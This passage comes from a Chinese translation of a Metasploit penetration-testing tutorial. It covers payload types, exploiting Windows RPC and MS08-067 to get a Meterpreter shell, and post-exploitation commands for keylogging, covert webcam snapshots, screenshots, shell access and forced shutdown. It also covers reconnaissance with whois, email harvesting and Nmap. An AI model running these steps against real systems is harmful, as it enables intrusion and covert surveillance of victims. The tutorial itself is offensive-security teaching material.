![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_21.jpg)

Singles 是用于特定任务的独立 payload，比如创建用户、绑定 shell 等。举个例子，`windows`/`adduser` payload 用于创建用户账户。现在我们将探索`singles` payload 目录。在这里我们会看到 payload 被根据操作系统进行分类，比如 AIX、BSD、Windows、Linux 等。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_22.jpg)

我们将使用`windows`目录来演示 payload 的工作原理。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_23.jpg)

我们将使用已经解释过的`adduser` payload。我们可以通过输入`cat adduser.rb`来查看这个 payload 的代码。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_24.jpg)

Stagers 是使攻击者和受害者机器之间建立连接的 payload。举个例子，如果我们想要注入`meterpreter` payload，我们无法将整个 Meterpreter DLL 放入一个 payload 中，因此整个过程被分成两部分。第一部分是称为 stagers 的较小的 payload。在执行 stagers 后，它们会在攻击者和受害者之间建立网络连接。通过这个网络连接，一个更大的 payload 被传递到受害者机器上，这个更大的 payload 被称为 stages。

现在我们将探索`stagers` payload 目录。正如我们在下面的截图中所看到的，payload 被根据不同的操作系统进行分类：

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_25.jpg)

举个例子，我们将探索`bsd`目录并检查 payload 列表。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_26.jpg)

Stages 是被 stagers payload 下载并执行的 payload 类型，比如 Meterpreter、VNC 服务器等。

现在我们将探索`stages`目录以查看 payload 列表。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_27.jpg)

在这里我们看到了与`singles`和`stagers`目录中相同的结果；payload 被根据不同的操作系统进行分类。我们打开`netware`目录查看列表。

![深入了解 Payloads](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_28.jpg)

# 摘要

在本章中，我们介绍了 Metasploit Framework 的不同接口和架构。本章的流程包括了 Metasploit 的操作技术，然后是架构基础。我们进一步介绍了各种 Metasploit 库和应用接口，如 Rex、Msf core 和 Msf base。然后我们深入探讨了 Metasploit 目录以及重要目录的描述。

然后我们转向 exploit 目录，并简要解释了如何根据操作系统和其服务对 exploits 进行分类。然后我们转向辅助目录，并探讨了如何根据服务对辅助模块进行分类，如扫描和模糊测试。

我们还介绍了另一个重要的目录，即 payload 目录，它展示了 payloads 如何被分类为三种不同类型。我们还根据操作系统对 payloads 进行了进一步分类。

通过本章，我们能够介绍基本的 Metasploit Framework 和架构。在下一章中，我们将开始一些有关利用基础的实际操作。

# 参考资料

以下是一些有用的参考资料，进一步阐明了本章涉及的一些主题。

+   [`en.wikipedia.org/wiki/Metasploit_Project`](http://en.wikipedia.org/wiki/Metasploit_Project)

+   [`www.offensive-security.com/metasploit-unleashed/Metasploit_Architecture`](http://www.offensive-security.com/metasploit-unleashed/Metasploit_Architecture)

+   [`www.offensive-security.com/metasploit-unleashed/Metasploit_Fundamentals`](http://://www.offensive-security.com/metasploit-unleashed/Metasploit_Fundamentals)

+   [`www.offensive-security.com/metasploit-unleashed/Exploits`](http://://www.offensive-security.com/metasploit-unleashed/Exploits)

+   [`www.offensive-security.com/metasploit-unleashed/Payloads`](http://://www.offensive-security.com/metasploit-unleashed/Payloads)

+   [`www.securitytube.net/video/2635`](http://www.securitytube.net/video/2635)

+   [`metasploit.hackplanet.in/2012/07/architecture-of-metasploit.html`](http://metasploit.hackplanet.in/2012/07/architecture-of-metasploit.html)


# 第三章：剥削基础

剥削指的是入侵计算机系统的艺术。计算机剥削的基础涉及对漏洞和有效载荷的深入理解。剥削是一段精心编写的代码，在目标系统上编译和执行，可能会危害该系统。剥削通常针对已知的漏洞、服务中的缺陷或编写不良的代码。在本章中，我们将讨论如何找到易受攻击的系统并对其进行剥削的基础知识。

# 剥削的基本术语

剥削的基本术语解释如下：

+   **漏洞：** 漏洞是软件或硬件中的安全漏洞，允许攻击者入侵系统。漏洞可以是一个简单的弱密码，也可以是一个复杂的拒绝服务攻击。

+   **剥削：** 剥削指的是一个众所周知的安全漏洞或错误，黑客通过它进入系统。剥削是攻击者利用特定漏洞的实际代码。

+   **有效载荷：** 一旦一个剥削在易受攻击的系统上执行并且系统已经被入侵，有效载荷使我们能够控制系统。有效载荷通常附加在剥削中并交付。

+   **Shellcode：** 这是一组指令，通常在剥削发生时用作有效载荷。

+   **监听器：** 监听器作为一个组件，等待着传入的连接。![剥削的基本术语](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_01.jpg)

## 剥削是如何工作的？

我们考虑一个计算机实验室的场景，其中有两名学生在他们的计算机上工作。过了一会儿，其中一名学生出去喝咖啡，他负责地锁定了他的计算机。该特定锁定计算机的密码是`Apple`，这是一个非常简单的词典单词，是系统的漏洞。另一名学生开始尝试对离开实验室的学生的系统进行密码猜测攻击。这是一个典型的剥削示例。帮助恶意用户在成功登录计算机后控制系统的控件被称为有效载荷。

现在我们来到更大的问题，即剥削实际上是如何工作的。攻击者基本上向易受攻击的系统发送一个带有附加有效载荷的剥削。剥削首先运行，如果成功，有效载荷的实际代码就会运行。有效载荷运行后，攻击者将完全特权访问易受攻击的系统，然后他可以下载数据，上传恶意软件、病毒、后门，或者任何他想要的东西。

![剥削是如何工作的？](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_02.jpg)

## 入侵系统的典型过程

为了入侵任何系统，第一步是扫描 IP 地址以找到开放的端口及其操作系统和服务。然后我们继续识别易受攻击的服务，并在 Metasploit 中找到该特定服务的剥削。如果在 Metasploit 中找不到剥削，我们将通过互联网数据库如[www.securityfocus.com](http://www.securityfocus.com), [www.exploitdb.com](http://www.exploitdb.com), [www.1337day.com](http://www.1337day.com)等进行搜索。成功找到剥削后，我们启动剥削并入侵系统。

常用于端口扫描的工具有**Nmap**（网络映射器）、Autoscan、Unicorn Scan 等。例如，在这里我们使用 Nmap 进行扫描以显示开放的端口及其服务。

首先在您的 BackTrack 虚拟机中打开终端。输入`nmap –v –n 192.168.0.103`并按*Enter*进行扫描。我们使用`–v`参数获取详细输出，`–n`参数禁用反向 DNS 解析。

![入侵系统的典型过程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_03.jpg)

在这里，我们可以看到 Nmap 的结果，显示了三个开放端口及其上运行的服务。如果我们需要更详细的信息，比如服务版本或操作系统类型，我们必须使用 Nmap 进行强烈扫描。对于强烈扫描，我们使用命令`nmap –T4 –A –v 192.168.0.103`。这会显示服务版本和操作系统类型的完整结果。

![入侵系统的典型过程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_04.jpg)

下一步是根据服务或其版本查找漏洞。在这里，我们可以看到在端口号`135`上运行的第一个服务是`msrpc`，也就是 Microsoft Windows RPC。现在我们将学习如何在 Metasploit 中为这个特定服务找到漏洞。让我们打开终端并输入`msfconsole`来启动 Metasploit。在输入`search dcom`后，它会在其数据库中搜索所有与 Windows RPC 相关的漏洞。

在下面的截图中，我们可以看到漏洞及其描述，以及此漏洞的发布日期。我们根据其排名列出了一系列漏洞。从与此漏洞相关的三个漏洞中，我们选择第一个，因为它是最有效的漏洞，排名最高。现在我们已经学会了通过`search <service name>`命令在 Metasploit 中搜索漏洞的技巧。

![入侵系统的典型过程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_05.jpg)

### 从在线数据库中查找漏洞

如果 Metasploit 中没有该漏洞，则我们必须在互联网漏洞数据库中搜索该特定漏洞。现在我们将学习如何在这些在线服务（如[www.1337day.com](http://www.1337day.com)）上搜索漏洞。我们打开网站并点击**搜索**选项卡。例如，我们将搜索 Windows RPC 服务的漏洞。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_06.jpg)

现在我们需要下载并保存特定的漏洞。只需点击您需要的漏洞。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_07.jpg)

点击漏洞后，它会显示该漏洞的描述。点击**打开材料**以查看或保存漏洞。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_08.jpg)

在漏洞代码的文档中提供了该漏洞的使用方法，如下截图所示：

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_09.jpg)

现在我们将利用我们已经下载的特定漏洞来攻击目标机器。我们已经扫描了 IP 地址并找到了三个开放端口。下一步将是利用其中一个端口。例如，我们将针对运行在目标机器上的端口号`135`服务进行攻击，即`msrpc`。让我们从编译已下载的漏洞代码开始。要编译代码，请启动终端并输入`gcc <exploit name with path> -o<exploitname>`。例如，在这里我们输入`gcc –dcom –o dcom`。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_10.jpg)

编译漏洞后，我们得到了该漏洞的二进制文件，我们可以通过在终端中输入`./<filename>`来运行该文件以利用目标。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_11.jpg)

从前面的截图中，我们可以看到利用目标的要求。它需要目标 IP 地址和 ID（Windows 版本）。让我们看看我们的目标 IP 地址。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_12.jpg)

我们有目标 IP 地址，所以让我们开始攻击。输入`./dcom 6 192.168.174.129`。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_13.jpg)

目标已被攻击，我们已经获得了命令 shell。现在检查受害者机器的 IP 地址。输入`ipconfig`。

![从在线数据库中查找漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_14.jpg)

目标已经受到威胁，我们实际上已经获得了对其的访问权限。

现在我们将看到如何使用 Metasploit 的内部漏洞利用。我们已经扫描了一个 IP 地址，并找到了三个开放的端口。这次我们针对运行 Microsoft-ds 服务的端口号 445。

让我们从选择一个漏洞利用开始。启动 msfconsole，输入`use exploit/windows/smb/ms08_067_netapi`，然后按*Enter*。

从在线数据库中查找漏洞利用

下一步将是检查漏洞利用的选项以及执行成功利用所需的条件。我们输入`show options`，它将显示我们的要求。我们需要设置**RHOST**（**远程主机**），即目标 IP 地址，并让其他选项保持默认值。

![从在线数据库中查找漏洞利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_16.jpg)

通过输入`set RHOST 192.168.0.103`来设置`RHOST`或目标地址。

![从在线数据库中查找漏洞利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_17.jpg)

设置完选项后，我们就可以利用我们的目标了。输入`exploit`将给我们提供 Meterpreter shell。

![从在线数据库中查找漏洞利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_03_18.jpg)

# 摘要

在本章中，我们介绍了漏洞性、有效载荷以及有关利用的一些建议。我们还介绍了如何搜索易受攻击的服务，并进一步查询 Metasploit 数据库以获取漏洞利用的技术。然后利用这些漏洞利用来破坏易受攻击的系统。我们还演示了在互联网数据库中搜索漏洞利用的技巧，这些数据库包含了关于软件和服务的零日漏洞利用。在下一章中，我们将介绍 Meterpreter 的基础知识和深入的利用策略。

# 参考

以下是一些有用的参考资料，进一步阐明了本章涉及的一些主题：

+   [`www.securitytube.net/video/1175`](http://www.securitytube.net/video/1175)

+   [`resources.infosecinstitute.com/system-exploitation-metasploit/`](http://resources.infosecinstitute.com/system-exploitation-metasploit/)


# 第四章：Meterpreter 基础知识

Meterpreter 是 Metasploit 框架中的先锋之一。它用作易受攻击系统后的有效载荷。它使用内存中的 DLL 注入分段器，并在运行时通过网络进行扩展。内存中的 DLL 注入是一种用于在当前运行的进程的地址空间中注入代码的技术，通过强制它加载**DLL**（动态链接库）文件。一旦触发了漏洞并且 Meterpreter 被用作有效载荷，我们就会为受损系统获得一个 Meterpreter shell。其攻击向量的独特之处在于其隐蔽特性。它不会在硬盘上创建任何文件，而只是附加到内存中的活动进程。客户端-服务器之间的通信使用类型长度值格式并且是加密的。在数据通信协议中，可选信息可以被编码为类型长度值或 TLV 元素，这是协议内的一部分。在这里，类型表示消息的一部分的字段类型，长度表示值字段的大小，值表示可变大小的字节序列，其中包含此消息部分的数据。这个单一的有效载荷非常有效，具有多种功能，有助于获取受害者机器的密码哈希，运行键盘记录器和权限提升。其隐蔽特性使其对许多防病毒软件和基于主机的入侵检测系统不可检测。Meterpreter 还具有在不同进程之间切换的能力，它通过 DLL 注入附加到运行的应用程序，并且停留在受损主机上，而不是在系统上创建文件。

在上一章中，我们妥协了一个系统，以获得 Meterpreter 的反向连接。现在我们将讨论我们可以在受损系统后利用的功能，比如 Meterpreter 的工作和实际操作。

# Meterpreter 的工作

一旦系统被攻破，我们（攻击者）向受影响的系统发送第一阶段的有效载荷。这个有效载荷连接到 Meterpreter。然后发送第二个 DLL 注入有效载荷，然后是 Meterpreter 服务器 DLL。这建立了一个套接字，通过 Meterpreter 会话可以进行客户端-服务器通信。这个会话的最好部分是它是加密的。这提供了机密性，因此会话可能不会被任何网络管理员嗅探到。

![Meterpreter 的工作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_01.jpg)

# Meterpreter 实际操作

在第三章中，*利用基础知识*，我们能够利用受害者机器并从中获得 Meterpreter 会话。现在我们将使用这个 Meterpreter 会话来利用 Metasploit 框架的各种功能。

![Meterpreter 实际操作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_02.jpg)

现在我们将显示 Meterpreter 主机的所有攻击武器。为此，输入`help`。

![Meterpreter 实际操作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_03.jpg)

在前面的屏幕截图中，我们看到了可以在受损系统上使用的所有 Meterpreter 命令。

根据使用情况，我们有一些分类的命令；它们列如下：

| 命令类型 | 命令名称 | 描述 |
| --- | --- | --- |
| 进程列表 | `getuid` | 它获取系统 ID 和计算机名称。 |
|   | `kill` | 它终止一个进程。 |
|   | `ps` | 它列出正在运行的进程。 |
|   | `getpid` | 它获取当前进程标识符。 |
| 按键记录使用 | `keyscan_start` | 它启动按键记录会话。 |
|   | `keyscan_stop` | 它停止按键记录会话。 |
|   | `keyscan_dump` | 它从受害者机器中转储捕获的按键。 |
| 会话 | `enumdesktops` | 它列出所有可访问的桌面和工作站。 |
|   | `getdesktop` | 它获取当前 Meterpreter 桌面。 |
|   | `setdesktop` | 它更改 Meterpreter 的当前桌面。 |
| 嗅探器功能 | `use sniffer` | 它加载嗅探器功能。 |
| | `sniffer_start` | 它启动接口的嗅探器。 |
| | `sniffer_dump` | 它在本地转储受害者机器的网络捕获。 |
| | `sniffer_stop` | 它停止接口的嗅探器。 |
| 摄像头命令 | `webcam_list` | 它列出系统中的所有网络摄像头。 |
| | `webcam_snap` | 它捕获受害者机器的快照。 |
| | `record_mic` | 它记录机器上默认麦克风的环境声音。 |

现在，我们将开始渗透测试程序，并执行第一步，开始收集有关受害者机器的信息。键入`sysinfo`以检查系统信息。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_04.jpg)

我们可以在上述截图中看到系统信息，受害者使用的计算机名称和操作系统。现在，我们将捕获受害者机器的屏幕截图。为此，键入`screenshot`。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_05.jpg)

我们可以看到受害者机器的屏幕截图如下：

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_06.jpg)

让我们检查受害者机器上运行的所有进程列表。只需键入`ps`，它将显示正在运行的进程。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_07.jpg)

在上述截图中，我们可以看到进程列表，以及详细信息。第一列显示 PID，即进程 ID，第二列显示进程名称。下一列显示系统的架构，用户和进程运行的路径。 

在进程列表中，我们必须找到`explorer.exe`的进程 ID，然后使用该进程 ID 进行迁移。要使用任何进程 ID 进行迁移，我们必须键入`migrate <PID>`。在这里，我们正在使用`explorer.exe`进行迁移，因此我们键入`migrate 1512`。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_08.jpg)

迁移进程后，我们然后识别当前进程。为此，键入`getpid`。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_09.jpg)

我们可以从中看到当前进程 ID，我们已经迁移到受害者机器。

接下来，我们将通过在受害者机器上使用键盘记录服务来进行一些真正的黑客活动。我们键入`keyscan_start`，键盘记录将开始并等待几分钟来捕获受害者机器的按键。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_10.jpg)

受害者已开始在记事本中输入内容。让我们检查是否有捕获。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_11.jpg)

现在，让我们停止键盘记录服务并转储受害者机器的所有按键记录。为此，键入`keyscan_dump`，然后键入`keyscan_stop`以停止键盘记录服务。您可以在以下截图中看到我们的确切捕获。太棒了！

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_12.jpg)

让我们在 Meterpreter 会话中尝试一些更有趣的活动。让我们检查受害者机器是否有可用的网络摄像头。为此，我们键入`webcam_list`，它会显示受害者机器的网络摄像头列表。在下面的截图中，我们可以看到有一个网络摄像头可用。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_13.jpg)

因此，我们知道受害者有一台集成的网络摄像头。因此，让我们从他/她的网络摄像头中捕获受害者的快照。只需键入`webcam_snap`。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_14.jpg)

在上一张截图中，我们可以看到网络摄像头拍摄的照片已保存到根目录，并且图像命名为`yxGSMosP.jpeg`。因此，让我们验证根目录中捕获的图像。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_15.jpg)

接下来，我们将检查系统 ID 和受害者机器的名称。键入`getuid`。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_16.jpg)

在玩弄受害者机器之后，现在是进行一些严肃工作的时候了。我们将访问受害者的命令 shell 来控制他/她的系统。只需输入`shell`，它将为您打开一个新的命令提示符。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_17.jpg)

现在让我们在受害者机器上创建一个目录。输入`mkdir <directory name>`。我们正在`C:\Documents and Settings\Victim`中创建一个名为`hacked`的目录。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_18.jpg)

让我们验证一下目录是否已经在`C:\Documents and Settings\Victim`下创建了。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_19.jpg)

现在我们将通过在屏幕上显示一条消息来关闭受害者计算机。为此，请输入`shutdown –s –t 15 -c "YOU ARE HACKED"`。在以下命令中，我们使用的语法是：`–s`表示关闭，`–t 15`表示超时，`–c`表示消息或注释。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_20.jpg)

让我们看看在受害者机器上发生了什么。

![Meterpreter in action](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_04_21.jpg)

# 摘要

所以，通过这一章，我们已经介绍了用户如何通过 Meterpreter 妥协系统，以及他/她可能利用 Meterpreter 功能进行利用后提取的信息。一旦我们妥协了受害者的系统，我们就能够获取系统信息，包括操作系统名称、架构和计算机名称。之后，我们能够捕获受害者机器桌面的截图。通过 Meterpreter，我们直接访问了受害者机器的 shell，因此可以检查正在运行的进程。我们能够安装键盘记录器并捕获受害者机器的活动按键。使用 Meterpreter，我们甚至可以使用受害者的摄像头在不被注意的情况下捕获他的快照。

整个章节都涉及到了一些真正的黑客行为，以及利用受害者机器来执行自己命令的不同方式。因此，受害者机器只是一个简单的傀儡，随着攻击者的命令而舞动。由于我们可以访问受害者的 shell，我们可以格式化他的硬盘，创建新文件，甚至复制他的机密数据。下一章将涵盖信息收集和扫描阶段。

# 参考资料

以下是一些有用的参考资料，可以进一步了解本章涉及的一些主题：

+   [`www.offensive-security.com/metasploit-unleashed/About_Meterpreter`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8About_Meterpreter)

+   [`cyruslab.wordpress.com/2012/03/07/metasploit-about-meterpreter/`](http://cyruslab.wordpress.com/2012/03/07/metasploit-about-meterpreter/)

+   [`github.com/rapid7/metasploit-framework/wiki/How-payloads-work`](https://github.com/rapid7/metasploit-framework/wiki/%E2%80%A8How-payloads-work)

+   [`www.isoc.my/profiles/blogs/working-with-meterpreter-on-metasploit`](http://www.isoc.my/profiles/blogs/working-with-meterpreter-on-metasploit)


# 第五章：漏洞扫描和信息收集

在上一章中，我们介绍了 Meterpreter 的各种功能以及应对客户端利用应采取的方法。现在我们慢慢深入探讨利用原则，首先是信息收集阶段。我们解释了通过哪些技术可以收集我们受害者的信息，用于攻击前的分析。随着漏洞数量的增加，我们已经开始使用自动化漏洞扫描工具。本章旨在掌握漏洞扫描的艺术，这是利用的第一步。将涵盖的一些模块如下：

+   通过 Metasploit 进行信息收集

+   使用 Nmap

+   使用 Nessus

+   在 Metasploit 中导入报告

# 通过 Metasploit 进行信息收集

信息收集是通过各种技术收集有关受害者的信息的过程。基本上分为足迹和扫描两个步骤。关于组织的许多信息都可以在组织的网站、商业新闻、职位门户网站、不满的员工等公开获取。恶意用户可能能够通过这个阶段找到属于组织的域名、远程访问信息、网络架构、公共 IP 地址等更多信息。

Metasploit 是一个非常强大的工具，其中包含一些用于信息收集和分析的强大工具。其中一些包括：Nmap，Nessus 与 Postgres 支持用于传输报告，然后利用 Metasploit 收集的信息进行利用等。Metasploit 已经集成了 Postgres，这在测试阶段间接有助于存储渗透测试结果更长的时间。信息收集阶段被认为非常重要，因为攻击者使用这些工具来收集有关破坏受害者的重要信息。Metasploit 辅助模块有各种扫描，从 ARP 到 SYN，甚至基于服务的扫描，如 HTTP、SMB、SQL 和 SSH。这些实际上有助于对服务版本进行指纹识别，甚至一些关于可能使用服务的平台的信息。因此，通过这些规格，我们的攻击域受到了进一步限制，以便更有效地打击受害者。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_01.jpg)

图片来源：[`s3.amazonaws.com/readers/2010/12/20/spyware_1.jpg`](http://s3.amazonaws.com/readers/2010/12/20/spyware_1.jpg)

我们继续通过 Metasploit 进行一些实际的信息收集。假设我们是攻击者，我们有一个需要利用的域。第一步应该是为了恶意目的检索有关该域的所有信息。`Whois`是信息收集的最佳方法之一。它被广泛用于查询存储互联网资源的注册用户的数据库，如域名、IP 地址等。

打开`msfconsole`并输入`whois <domain name>`。例如，这里我们使用我的域名`whois <techaditya.in>`。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_02.jpg)

我们可以看到与我们的域相关的大量信息。在 Metasploit 中，有许多辅助扫描器，非常适用于通过电子邮件收集信息。电子邮件收集是一个非常有用的工具，可以获取与特定域相关的电子邮件 ID。

要使用电子邮件收集辅助模块，请输入`use auxiliary/gather/search_email_collector`。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_03.jpg)

让我们看看可用的选项。为此，输入`show options`。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_04.jpg)

我们可以看到域是空白的，我们需要设置域地址。只需输入`set domain <domain name>`；例如，我们在这里使用`set domain techaditya.in`。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_05.jpg)

现在让我们运行辅助模块；只需输入`run`，它就会显示结果。

![通过 Metasploit 进行信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_06.jpg)

通过这些步骤，我们已经收集了关于我们受害者的许多公开信息。

# 主动信息收集

现在让我们进行一些主动信息收集，以便利用我们的受害者。另一个有用的辅助扫描器是 telnet 版本扫描器。要使用它，输入`use auxiliary/scanner/telnet/telnet_version`。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_07.jpg)

之后输入`show options`以查看可用选项。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_08.jpg)

我们可以看到`RHOSTS`选项为空，我们已经设置了用于扫描 telnet 版本的目标 IP 地址，因此输入`set RHOSTS<target IP address>`。例如，在这里我们输入`set RHOSTS 192.168.0.103`，然后输入`run`进行扫描。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_09.jpg)

我们的受害者已经被扫描，我们可以看到他的机器的 telnet 版本。

我们将使用另一个扫描器来查找**远程桌面**连接（**RDP**）是否可用，即 RDP 扫描器。但是，为此，我们必须知道远程桌面连接的端口号，即 3389，也称为 RDP 端口。输入`use auxiliary/scanner/rdp/ms12_020_check`，然后输入`show options`以查看详细的使用选项。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_10.jpg)

我们可以看到预定义的选项和端口范围为 1-10000。我们不需要扫描所有端口，因此我们定义 RDP 默认运行的端口号。之后，我们将`RHOST`设置为我们的目标地址。输入`set PORTS 3389`并按*Enter*，然后输入`set RHOST 192.168.11.46`。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_11.jpg)

一旦我们设置好所有选项，输入`run`。

![主动信息收集](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_12.jpg)

我们可以看到结果中 TCP 端口 3389 是开放的，用于远程桌面连接。

# 使用 Nmap

Nmap 是由*Gordon Lyon*开发的强大安全扫描仪，用于在计算机网络上检测主机、服务和开放端口。它具有许多功能，如隐身扫描、侵略性扫描、防火墙规避扫描，并且具有指纹识别操作系统的能力。它有自己的 Nmap 脚本引擎，可以与 Lua 编程语言一起使用来编写定制脚本。

我们从使用 Metasploit 进行 Nmap 扫描的基本技术开始。

扫描单个目标——在目标地址上运行 Nmap 而不使用命令选项将对目标地址执行基本扫描。目标可以是 IPV4 地址或其主机名。让我们看看它是如何工作的。打开终端或`msfconsole`，输入`nmap <target>`，例如，`nmap 192.168.11.29`。

![使用 Nmap](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_13.jpg)

扫描结果显示了目标上检测到的端口的状态。结果分为三列，即`PORT`、`STATE`和`SERVICE`。`PORT`列显示端口号，`STATE`列显示端口的状态，即开放或关闭，`SERVICE`显示在该端口上运行的服务类型。

端口的响应被分类为六种不同的状态消息，分别是：开放、关闭、过滤、未过滤、开放过滤和关闭过滤。

以下是用于扫描多个主机的不同类型的 Nmap 扫描选项：

+   **扫描多个目标**：Nmap 可以同时扫描多个主机。最简单的方法是将所有目标放在一个由空格分隔的字符串中。输入`nmap <目标 目标>`，例如，`nmap 192.168.11.46 192.168.11.29`。![使用 Nmap](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_14.jpg)

我们可以看到两个 IP 地址的结果。

